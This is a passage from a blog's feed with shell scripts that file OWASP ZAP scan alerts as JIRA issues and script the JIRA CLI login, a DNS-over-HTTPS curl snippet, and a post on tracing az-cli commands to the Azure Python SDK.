  <span class="nb">echo</span> <span class="s2">"[i] Reading alerts conf file for alerts to ignore"</span>
  <span class="nv">ignore_ids</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="k">${</span><span class="nv">ignore_ids</span><span class="k">}</span>  | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'^#'</span> | <span class="nb">grep </span>IGNORE | <span class="nb">awk</span> <span class="s1">'{ print $1 }'</span> | <span class="nb">tr</span> <span class="s1">'\r\n'</span> <span class="s1">' '</span><span class="si">)</span><span class="s2">"</span>
<span class="k">fi

if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="k">${</span><span class="nv">target_host</span><span class="k">}</span><span class="s2">"</span> <span class="o">]</span>
<span class="k">then
  </span><span class="nb">echo</span> <span class="s1">'[!] You need to provide a target host ./zap_alerts_to_jira.sh report.json myapp.com'</span>
  <span class="nb">exit </span>10
<span class="k">fi

</span>should_ignore_id<span class="o">()</span>
<span class="o">{</span>
  <span class="nb">local id</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
  <span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$ignore_ids</span><span class="s2">"</span> <span class="o">]</span>
  <span class="k">then
    return </span>1
  <span class="k">fi

  for </span>iid <span class="k">in</span> <span class="k">${</span><span class="nv">ignore_ids</span><span class="k">}</span>
  <span class="k">do
    if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$iid</span><span class="s2">"</span> <span class="o">==</span> <span class="s2">"</span><span class="nv">$id</span><span class="s2">"</span> <span class="o">]</span>
    <span class="k">then
      return </span>0
    <span class="k">fi
  done
  return </span>1
<span class="o">}</span>

create_jira_issue<span class="o">()</span> 
<span class="o">{</span>
  <span class="nb">local </span><span class="nv">summary</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
  <span class="nb">local </span><span class="nv">alert</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
  <span class="nv">description</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">alert</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s1">'.description,"\n", (.uris[] | " - \(.)")'</span> | <span class="nb">sed</span> <span class="s2">"s/://g"</span><span class="si">)</span>
  
  <span class="c"># If you want to add custom fields etc, you will need to change the go-jira create templates</span>
  <span class="c"># which can be generated with `jira export-templates` and then</span>
  <span class="c"># adjusted in ~/.jira.d/templates/create</span>
  jira create <span class="nt">--project</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">project</span><span class="k">}</span><span class="s2">"</span> <span class="se">\</span>
    <span class="nt">--issuetype</span><span class="o">=</span>Task <span class="se">\</span>
    <span class="nt">--noedit</span> <span class="se">\</span>
    <span class="nt">--override</span><span class="o">=</span><span class="s2">"summary=</span><span class="k">${</span><span class="nv">summary</span><span class="k">}</span><span class="s2">"</span> <span class="se">\</span>
    <span class="nt">--override</span><span class="o">=</span><span class="s2">"description=</span><span class="k">${</span><span class="nv">description</span><span class="k">}</span><span class="s2">"</span>
<span class="o">}</span>

handle_target_alerts<span class="o">()</span>
<span class="o">{</span>
  <span class="nb">local </span><span class="nv">target</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
  <span class="nb">local </span><span class="nv">alerts</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
  <span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> alert
  <span class="k">do
    </span><span class="nb">id</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">alert</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s1">'.id'</span><span class="si">)</span>
    <span class="nv">prefix</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">alert</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s1">'"\(.id) -- \(.name)"'</span><span class="si">)</span>

    <span class="k">if </span>should_ignore_id <span class="s2">"</span><span class="nv">$id</span><span class="s2">"</span>
    <span class="k">then
      </span><span class="nb">echo</span> <span class="s2">"[i] Ignoring alert </span><span class="nv">$prefix</span><span class="s2">"</span>
      <span class="k">continue
    fi

    </span><span class="nv">risk_code</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">alert</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s1">'.riskcode'</span><span class="si">)</span>

    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$risk_code</span><span class="s2">"</span> <span class="o">==</span> <span class="s2">"0"</span> <span class="o">]</span>
    <span class="k">then
      </span><span class="nb">echo</span> <span class="s2">"[i] Low risk ... skipping creating [</span><span class="k">${</span><span class="nv">prefix</span><span class="k">}</span><span class="s2">]"</span>
      <span class="k">continue
    fi</span>

    <span class="c"># If you change your summary after issues have been created, you will end up with duplicates</span>
    <span class="nv">summary</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">prefix</span><span class="k">}</span><span class="s2"> -- </span><span class="k">${</span><span class="nv">target</span><span class="k">}</span><span class="s2">"</span>
    <span class="nv">found</span><span class="o">=</span><span class="si">$(</span>jira list <span class="nt">--limit</span><span class="o">=</span>1 <span class="nt">--query</span> <span class="s2">"project=</span><span class="k">${</span><span class="nv">project</span><span class="k">}</span><span class="s2"> AND summary~'</span><span class="se">\"</span><span class="k">${</span><span class="nv">summary</span><span class="k">}</span><span class="se">\"</span><span class="s2">'"</span><span class="si">)</span>

    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="k">${</span><span class="nv">found</span><span class="k">}</span><span class="s2">"</span> <span class="o">==</span> <span class="s2">""</span> <span class="o">]</span>
    <span class="k">then
      </span>create_jira_issue <span class="s2">"</span><span class="k">${</span><span class="nv">summary</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">alert</span><span class="k">}</span><span class="s2">"</span>
    <span class="k">else
      </span><span class="nv">issue_key</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">found</span><span class="k">}</span><span class="s2">"</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">':'</span> <span class="nt">-f1</span><span class="si">)</span>
      <span class="nb">echo</span> <span class="s2">"[i] Issue already being tracked </span><span class="k">${</span><span class="nv">issue_key</span><span class="k">}</span><span class="s2"> [</span><span class="k">${</span><span class="nv">prefix</span><span class="k">}</span><span class="s2">]"</span>
      jira comment <span class="s2">"</span><span class="k">${</span><span class="nv">issue_key</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--noedit</span>  <span class="nt">--comment</span><span class="o">=</span><span class="s1">'ZAP issue still being seen'</span>
    <span class="k">fi
  done</span><span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="k">${</span><span class="nv">alerts</span><span class="k">}</span><span class="s2">"</span>
<span class="o">}</span>

<span class="k">if</span> <span class="o">!(</span><span class="nb">command</span> <span class="nt">-v</span> jira<span class="o">)</span> <span class="o">||</span> <span class="o">!(</span><span class="nb">command</span> <span class="nt">-v</span> jq<span class="o">)</span>
<span class="k">then
  </span><span class="nb">echo</span> <span class="s2">"[!] Expects jira cli &amp; jq to be installed"</span>
  <span class="nb">echo</span> <span class="s2">" - https://github.com/Netflix-Skunkworks/go-jira"</span>
  <span class="nb">exit </span>1
<span class="k">fi

if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"</span><span class="k">${</span><span class="nv">report_file</span><span class="k">}</span><span class="s2">"</span> <span class="o">]</span>
<span class="k">then
  </span><span class="nb">echo</span> <span class="s2">"[!] That does not appear to be a report file </span><span class="k">${</span><span class="nv">report_file</span><span class="k">}</span><span class="s2">"</span>
  <span class="nb">exit </span>1
<span class="k">fi

if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="k">${</span><span class="nv">project</span><span class="k">}</span><span class="s2">"</span> <span class="o">]</span>
<span class="k">then
  </span><span class="nb">echo</span> <span class="s1">'[!] Specify your jira project with JIRA_PROJECT env variable'</span>
  <span class="nb">exit </span>1
<span class="k">fi

</span><span class="nb">echo</span> <span class="s1">'[i] Checking if the configured JIRA project exists'</span>

<span class="k">if</span> <span class="o">!(</span>jira list <span class="nt">--project</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">project</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--limit</span><span class="o">=</span>1<span class="o">)</span>
<span class="k">then
  </span><span class="nb">echo</span> <span class="s2">"[!] That project does not exist"</span>
  <span class="nb">exit </span>1
<span class="k">fi

</span><span class="nv">site_type</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> <span class="s2">"</span><span class="k">${</span><span class="nv">report_file</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s1">'.site | type'</span><span class="si">)</span>
<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$site_type</span><span class="s2">"</span> <span class="o">==</span> <span class="s2">"array"</span> <span class="o">]</span>
<span class="k">then
  </span><span class="nv">max</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> <span class="s2">"</span><span class="k">${</span><span class="nv">report_file</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s1">'.site | length'</span><span class="si">)</span>
  <span class="nv">max</span><span class="o">=</span><span class="k">$((</span>max-1<span class="k">))</span>
  <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>0 <span class="nv">$max</span><span class="si">)</span>
  <span class="k">do
    </span><span class="nv">target</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> <span class="s2">"</span><span class="k">${</span><span class="nv">report_file</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s2">".site[</span><span class="nv">$i</span><span class="s2">][</span><span class="se">\"</span><span class="s2">@host</span><span class="se">\"</span><span class="s2">]"</span><span class="si">)</span>

    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="k">${</span><span class="nv">target</span><span class="k">}</span><span class="s2">"</span> <span class="o">!=</span> <span class="s2">"</span><span class="k">${</span><span class="nv">target_host</span><span class="k">}</span><span class="s2">"</span> <span class="o">]</span>
    <span class="k">then
      </span><span class="nb">echo</span> <span class="s2">"[!] Ignoring alerts for </span><span class="k">${</span><span class="nv">target</span><span class="k">}</span><span class="s2">"</span> 
      <span class="k">continue
    fi

    </span><span class="nv">alerts</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> <span class="s2">"</span><span class="k">${</span><span class="nv">report_file</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="nt">-c</span> <span class="nt">-a</span> <span class="nt">-M</span> <span class="s2">".site[</span><span class="nv">$i</span><span class="s2">].alerts[] | {uris: [.instances[]|.uri], description: .desc, id: .pluginid, name: .alert, riskcode: .riskcode }"</span> | xargs <span class="nt">-L1</span> <span class="nt">-0</span><span class="si">)</span>
    handle_target_alerts <span class="s2">"</span><span class="k">${</span><span class="nv">target</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">alerts</span><span class="k">}</span><span class="s2">"</span>
  <span class="k">done
else 
  </span><span class="nv">target</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> <span class="s2">"</span><span class="k">${</span><span class="nv">report_file</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s1">'.site["@host"]'</span><span class="si">)</span>

  <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="k">${</span><span class="nv">target</span><span class="k">}</span><span class="s2">"</span> <span class="o">!=</span> <span class="s2">"</span><span class="k">${</span><span class="nv">target_host</span><span class="k">}</span><span class="s2">"</span> <span class="o">]</span>
  <span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"[!] Ignoring alerts for </span><span class="k">${</span><span class="nv">target</span><span class="k">}</span><span class="s2">"</span>
    <span class="k">return
  fi
    
  </span><span class="nv">alerts</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> <span class="s2">"</span><span class="k">${</span><span class="nv">report_file</span><span class="k">}</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="nt">-c</span> <span class="nt">-a</span> <span class="nt">-M</span> <span class="s1">'.site.alerts[] | {uris: [.instances[]|.uri], description: .desc, id: .pluginid, name: .alert, riskcode: .riskcode }'</span> | xargs <span class="nt">-L1</span> <span class="nt">-0</span><span class="si">)</span>
  handle_target_alerts <span class="s2">"</span><span class="k">${</span><span class="nv">target</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">alerts</span><span class="k">}</span><span class="s2">"</span>
<span class="k">fi</span>
</code></pre></div></div>

<p><br />
<strong>jira_cli_login.sh</strong><br />
Configuring authentication with the <code class="language-plaintext highlighter-rouge">jira</code> cli typically requires manually interaction. In the context of CI, configuring auth to work with <code class="language-plaintext highlighter-rouge">expect</code> is a bit hacky. Doing some digging, I found <code class="language-plaintext highlighter-rouge">jira</code> use a json file ( <code class="language-plaintext highlighter-rouge">~/.jira.d/cookies</code>) credentials … so I just created a script that generates that json file. <em>Warning, I haven’t tested this script in awhile</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nb">set</span> <span class="nt">-e</span>

<span class="nv">json</span><span class="o">=</span><span class="s1">'[{"Name":"atlassian.xsrf.token","Value":"","Path":"/","Domain":"jira.internal.net","Expires":"2030-04-30T11:35:02.409249143-07:00","RawExpires":"","MaxAge":0,"Secure":false,"HttpOnly":false,"Raw":"atlassian.xsrf.token=; Path=/","Unparsed":null},{"Name":"JSESSIONID","Value":"","Path":"/","Domain":"jira.internal.net","Expires":"2030-04-30T11:35:02.301767644-07:00","RawExpires":"","MaxAge":0,"Secure":false,"HttpOnly":true,"Raw":"JSESSIONID=; Path=/; HttpOnly","Unparsed":null}]'</span>
<span class="nv">cookies</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">--silent</span>  <span class="nt">--output</span> /dev/null  <span class="nt">-c</span> - <span class="nt">-X</span> POST   https://jira.internal.net/rest/auth/1/session   <span class="nt">-H</span> <span class="s1">'content-type: application/json'</span>   <span class="nt">-d</span> <span class="s1">'{ "username": "'</span><span class="s2">"</span><span class="nv">$JIRA_USER</span><span class="s2">"</span><span class="s1">'", "password": "'</span><span class="s2">"</span><span class="nv">$JIRA_PASS</span><span class="s2">"</span><span class="s1">' }'</span>  | <span class="nb">tail</span> <span class="nt">-n3</span> | <span class="nb">cut</span> <span class="nt">-f6</span>,7 | <span class="nb">tr</span> <span class="s1">'\t'</span> <span class="s1">'='</span><span class="si">)</span>
<span class="nv">token</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$cookies</span><span class="s2">"</span> | <span class="nb">grep </span>token | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'='</span> <span class="nt">-f2</span><span class="si">)</span>
<span class="nv">JID</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$cookies</span><span class="s2">"</span> | <span class="nb">grep </span>JSESSIONID | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'='</span> <span class="nt">-f2</span><span class="si">)</span>

<span class="nv">json</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$json</span><span class="s2">"</span> | <span class="nb">sed</span> <span class="s2">"s//</span><span class="nv">$token</span><span class="s2">/g"</span> <span class="si">)</span>
<span class="nv">json</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$json</span><span class="s2">"</span> | <span class="nb">sed</span> <span class="s2">"s//</span><span class="nv">$JID</span><span class="s2">/g"</span> <span class="si">)</span>

<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$json</span><span class="s2">"</span> <span class="o">&gt;</span> ~/.jira.d/cookies.js
</code></pre></div></div>]]></content><author><name></name></author><category term="security" /><category term="security" /><category term="zap" /><summary type="html"><![CDATA[Doing a baseline security scan of your web application before deployment is a simple way to improve the security of your application. Adding a scan to your CI as part of your SDLC makes it effortless to iterate and improve your application’s security. There are lots of options for scanning your web application, but in this post we’ll focus on scanning with OWASP ZAP! I’m going to walk through getting a basic scan setup and configured and then show how you can script up loading the results into JIRA. I don’t get into configuration details of the CI, I’ve done this setup primarily with teams using Jenkins, but it translate well into any CI. (If you are using Github, there is a nice post on ZAP with Github Actions)]]></summary></entry><entry><title type="html">dig without dig</title><link href="http://ahermosilla.com/snippet/2020/07/20/snippet-dig-without-dig.html" rel="alternate" type="text/html" title="dig without dig" /><published>2020-07-20T00:00:00+00:00</published><updated>2020-07-20T00:00:00+00:00</updated><id>http://ahermosilla.com/snippet/2020/07/20/snippet-dig-without-dig</id><content type="html" xml:base="http://ahermosilla.com/snippet/2020/07/20/snippet-dig-without-dig.html"><![CDATA[<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s1">'host: dns.google.com'</span> <span class="se">\</span>
  <span class="s1">'https://8.8.8.8/resolve?name=assets.github.com&amp;type=NS'</span> <span class="se">\</span>
  | jq
</code></pre></div></div>]]></content><author><name></name></author><category term="snippet" /><category term="dns" /><summary type="html"><![CDATA[curl -s -H 'host: dns.google.com' \ 'https://8.8.8.8/resolve?name=assets.github.com&amp;type=NS' \ | jq]]></summary></entry><entry><title type="html">Reverse Engineering the az-cli to use the python sdk</title><link href="http://ahermosilla.com/cloud/2020/07/15/reverse-engineering-az-cli-to-sdk.html" rel="alternate" type="text/html" title="Reverse Engineering the az-cli to use the python sdk" /><published>2020-07-15T00:00:00+00:00</published><updated>2020-07-15T00:00:00+00:00</updated><id>http://ahermosilla.com/cloud/2020/07/15/reverse-engineering-az-cli-to-sdk</id><content type="html" xml:base="http://ahermosilla.com/cloud/2020/07/15/reverse-engineering-az-cli-to-sdk.html"><![CDATA[<p>For scripting things in AWS, switching between boto and the aws cli is seamless because they use the same interfaces. The name of the python module matches the subcommand in the cli and the arguments and options all line up. This is not the case with Azure ….</p>

<p>There seems to be inconsistent names between the az-cli, azure-sdk &amp; the Azure portal, which makes creating scripts a bit challenging. Additionally challenging, the docs are not fleshed out and hard to find, so I’ve had to ‘trailblaze’ to discover how to use the sdk.</p>

<p>After wrestling through figuring out how to find &amp; install the modules necessary for certain datasets I have developed a pattern for discovering how to use the python sdk.</p>

<p><strong>Context</strong><br />
I was trying to create a script that pulled non-compliant resources from Azure Policy. The steps below document my journey to figuring out how to use the python sdk to do that.</p>

<h2 id="clone-azure-cli">Clone azure-cli</h2>
<p>Search around for an <code class="language-plaintext highlighter-rouge">az</code> command that has the same names in the portal or yields similar data to the UI.
Digging through <a href="https://docs.microsoft.com/en-us/cli/azure/policy/state?view=azure-cli-latest#az-policy-state-list">docs</a>, <code class="language-plaintext highlighter-rouge">az policy state list -g "NameOfResourceGroup"</code> looked like it was a good place to start. We are going to clone the <code class="language-plaintext highlighter-rouge">azure-cli</code> repo and look for the modules that are used for that command.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Clone repo</span>
git clone https://github.com/Azure/azure-cli
<span class="nb">cd </span>azure-cli

<span class="c"># Look for the command pattern</span>
<span class="c"># See output below</span>
ag <span class="nt">--python</span> <span class="s1">'policy state'</span>  <span class="nt">--ignore-dir</span> <span class="s1">'*test'</span> <span class="nt">--ignore</span> <span class="s1">'**help.py*'</span>
</code></pre></div></div>
<p><strong>Output</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>src/azure-cli/azure/cli/command_modules/policyinsights/_params.py
107:    with self.argument_context('policy state') as c:
112:            help='Within the specified time interval, get all policy states instead of the latest only.')
120:    with self.argument_context('policy state summarize') as c:

src/azure-cli/azure/cli/command_modules/policyinsights/commands.py
36:    with self.command_group('policy state', policy_states_sdk, client_factory=policy_states_operations) as g:

src/azure-cli/azure/cli/command_modules/sql/_params.py
790:                   help='Auditing policy state',
811:                   help='Threat detection policy state',
</code></pre></div></div>

<p>Now that the region of the code base is narrowed, let us open that directory in our editor <code class="language-plaintext highlighter-rouge">code src/azure-cli/azure/cli/command_modules/policyinsights/</code>.</p>

<p>When I look at the <code class="language-plaintext highlighter-rouge">commands.py</code> file, I notice <code class="language-plaintext highlighter-rouge">azure.mgmt.policyinsights.*</code>, which looks like a python module (which it is), so that is a good direction indicator.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ... Parts ommited for brevity
</span><span class="k">def</span> <span class="nf">load_command_table</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">_</span><span class="p">):</span>
    <span class="n">policy_events_sdk</span> <span class="o">=</span> <span class="nc">CliCommandType</span><span class="p">(</span>
        <span class="n">operations_tmpl</span><span class="o">=</span><span class="sh">'</span><span class="s">azure.mgmt.policyinsights.operations#PolicyEventsOperations.{}</span><span class="sh">'</span><span class="p">,</span>
        <span class="n">exception_handler</span><span class="o">=</span><span class="n">policy_insights_exception_handler</span>
    <span class="p">)</span>

    <span class="n">policy_states_sdk</span> <span class="o">=</span> <span class="nc">CliCommandType</span><span class="p">(</span>
        <span class="n">operations_tmpl</span><span class="o">=</span><span class="sh">'</span><span class="s">azure.mgmt.policyinsights.operations#PolicyStatesOperations.{}</span><span class="sh">'</span><span class="p">,</span>
        <span class="n">exception_handler</span><span class="o">=</span><span class="n">policy_insights_exception_handler</span>
    <span class="p">)</span>
</code></pre></div></div>

<p>Next I’ll do a case sensitive search for <code class="language-plaintext highlighter-rouge">Client</code> - I’ve noticed there a is <code class="language-plaintext highlighter-rouge">{$Service}Client</code> pattern in the python-sdk.</p>

<p><img src="/assets/img/reversing-az/code-find-client.png" alt="Search For Client" /></p>

<p>Sure enough, you can see the python module imported <code class="language-plaintext highlighter-rouge">from azure.mgmt.policyinsights import PolicyInsightsClient</code>. Equipped with that knowledge, we can take a look at the python sdk. The specific module is found in <a href="https://github.com/Azure/azure-sdk-for-python/tree/master/sdk/policyinsights/azure-mgmt-policyinsights/azure/mgmt/policyinsights">here</a> and we can take a look at it to figure out how to use it.</p>

<h2 id="look-at-requests-in-ui">Look at Requests in UI</h2>
<p><img src="/assets/img/reversing-az/az-policy.png" alt="AZ Policy" /></p>

<p>Starting with the cli is a good place to start, however it doesn’t always yield fruitful results.
Dig around in the UI for Policy, looking for properties, names, etc. One you can find is 
<code class="language-plaintext highlighter-rouge">providers/Microsoft.Management/managementGroups/corp/providers/Microsoft.Authorization/policyAssignments/205aa080f2cb4xxxxxxxx</code>. For me, the part that sticks out is the part right before an id, <code class="language-plaintext highlighter-rouge">policyAssignments</code>. Later, I’ll look for anything with <code class="language-plaintext highlighter-rouge">policy</code> in the type of a resource using the Resource Graph Explorer.</p>

<p>I’ve noticed many pages interact directly with the same apis that the az-cli and python-sdk do, so I’ll open my browser network requests inspector and see what I can find.</p>

<p><img src="/assets/img/reversing-az/az-policy-network.png" alt="AZ Policy Network" /></p>

<p>So far, the endpoint with consistently useful data is <code class="language-plaintext highlighter-rouge">batch?api-version=xxxx</code>. If you look at the request it gives you a hint at what endpoints we want to interact with. I look at the request and <code class="language-plaintext highlighter-rouge">Microsoft.PolicyInsights/policyStates</code> is the part that sticks out to me as interesting. It is contained in part of a url, likely from an API that the sdk interacts with.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"requests"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"httpMethod"</span><span class="p">:</span><span class="w"> </span><span class="s2">"POST"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"5f152e3e-xxxx-yyyy-zzzz-000000000000"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"requestHeaderDetails"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"commandName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Microsoft_Azure_Policy."</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://management.azure.com/providers/Microsoft.Management/managementGroups/codxxxxx/providers/Microsoft.PolicyInsights/policyStates/latest/queryResults?api-version=2019-10-01&amp;$top=250&amp;$select=resourceId,resourceType,resourceLocation,timestamp,complianceState,policyDefinitionVersion,policySetDefinitionVersion&amp;$filter=policyAssignmentId eq '/providers/Microsoft.Management/managementGroups/corp/providers/Microsoft.Authorization/policyAssignments/205aa080f2cb446a9exxxxxx' and policyDefinitionId eq '/providers/Microsoft.Authorization/policyDefinitions/34c877ad-xxxx-yyyy-zzzz-000000000000' and policyDefinitionReferenceId eq '13350666179920xxxxxxx' and ((complianceState eq 'noncompliant'))"</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Armed with a pattern to look for, let’s try finding <code class="language-plaintext highlighter-rouge">Microsoft.PolicyInsights/policyStates</code> in the SDK.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The sdk is ~200mb</span>
git clone https://github.com/Azure/azure-sdk-for-python
<span class="nb">cd </span>azure-sdk-for-python/
ag <span class="nt">--python</span> <span class="s1">'Microsoft.PolicyInsights/policyStates'</span>
</code></pre></div></div>

<p><strong>Output</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sdk/policyinsights/azure-mgmt-policyinsights/azure/mgmt/policyinsights/operations/_policy_states_operations.py
149:    list_query_results_for_management_group.metadata = {'url': '/providers/{managementGroupsNamespace}/managementGroups/{managementGroupName}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesResource}/queryResults'}
230:    summarize_for_management_group.metadata = {'url': '/providers/{managementGroupsNamespace}/managementGroups/{managementGroupName}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesSummaryResource}/summarize'}
331:    list_query_results_for_subscription.metadata = {'url': '/subscriptions/{subscriptionId}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesResource}/queryResults'}
411:    summarize_for_subscription.metadata = {'url': '/subscriptions/{subscriptionId}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesSummaryResource}/summarize'}
515:    list_query_results_for_resource_group.metadata = {'url': '/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesResource}/queryResults'}
598:    summarize_for_resource_group.metadata = {'url': '/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesSummaryResource}/summarize'}
704:    list_query_results_for_resource.metadata = {'url': '/{resourceId}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesResource}/queryResults'}
784:    summarize_for_resource.metadata = {'url': '/{resourceId}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesSummaryResource}/summarize'}
858:    trigger_subscription_evaluation.metadata = {'url': '/subscriptions/{subscriptionId}/providers/Microsoft.PolicyInsights/policyStates/latest/triggerEvaluation'}
936:    trigger_resource_group_evaluation.metadata = {'url': '/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.PolicyInsights/policyStates/latest/triggerEvaluation'}
1041:    list_query_results_for_policy_set_definition.metadata = {'url': '/subscriptions/{subscriptionId}/providers/{authorizationNamespace}/policySetDefinitions/{policySetDefinitionName}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesResource}/queryResults'}
1126:    summarize_for_policy_set_definition.metadata = {'url': '/subscriptions/{subscriptionId}/providers/{authorizationNamespace}/policySetDefinitions/{policySetDefinitionName}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesSummaryResource}/summarize'}
1231:    list_query_results_for_policy_definition.metadata = {'url': '/subscriptions/{subscriptionId}/providers/{authorizationNamespace}/policyDefinitions/{policyDefinitionName}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesResource}/queryResults'}
1315:    summarize_for_policy_definition.metadata = {'url': '/subscriptions/{subscriptionId}/providers/{authorizationNamespace}/policyDefinitions/{policyDefinitionName}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesSummaryResource}/summarize'}
1420:    list_query_results_for_subscription_level_policy_assignment.metadata = {'url': '/subscriptions/{subscriptionId}/providers/{authorizationNamespace}/policyAssignments/{policyAssignmentName}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesResource}/queryResults'}
1504:    summarize_for_subscription_level_policy_assignment.metadata = {'url': '/subscriptions/{subscriptionId}/providers/{authorizationNamespace}/policyAssignments/{policyAssignmentName}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesSummaryResource}/summarize'}
1612:    list_query_results_for_resource_group_level_policy_assignment.metadata = {'url': '/subscriptions/{subscriptionId}/resourcegroups/{resourceGroupName}/providers/{authorizationNamespace}/policyAssignments/{policyAssignmentName}/providers/Microsoft.PolicyInsights/policyStates/{policyStatesResource}/queryResults'}
